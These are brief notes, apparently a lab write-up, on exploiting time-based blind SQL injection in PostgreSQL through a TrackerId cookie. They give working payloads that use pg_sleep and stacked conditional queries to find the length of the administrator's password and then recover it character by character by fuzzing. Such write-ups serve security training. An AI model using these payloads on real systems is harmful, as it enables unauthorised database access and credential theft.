1) take a request and change the cookie TrackerId to 
' ||  pg_sleep(3) --

we can see here that it works and the server waits for 3 seconds

2) we can use conditional query to understand if we can retrieve information
'%3b SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users where username='administrator'--

        NOTE we need %3b because it is the URL encoding of ; and is used to close the query before

3) we can obtain the password with the substr 
'%3b SELECT CASE WHEN (substr(password,1,1)='a') THEN pg_sleep(7) ELSE pg_sleep(0) END FROM users where username='administrator'--
fuzz 1 from 1-20 and 'a' from a-z and 0-9
